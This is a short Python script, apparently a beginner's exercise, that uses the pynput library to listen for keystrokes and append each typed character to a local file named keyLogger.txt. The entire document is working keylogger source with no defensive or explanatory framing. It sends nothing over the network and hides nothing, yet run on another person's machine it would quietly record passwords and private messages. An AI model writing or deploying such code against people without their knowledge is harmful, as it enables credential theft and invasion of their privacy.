from pynput import keyboard as kp
def Keypressed(key):
    print(str(key))
    with open("keyLogger.txt","a") as KL:
        try:
            char=key.char
            KL.write(char)
        except:
            print("Error in getting char")


if __name__=="__main__":
    listener=kp.Listener(on_press=Keypressed)
    listener.start()
    input()
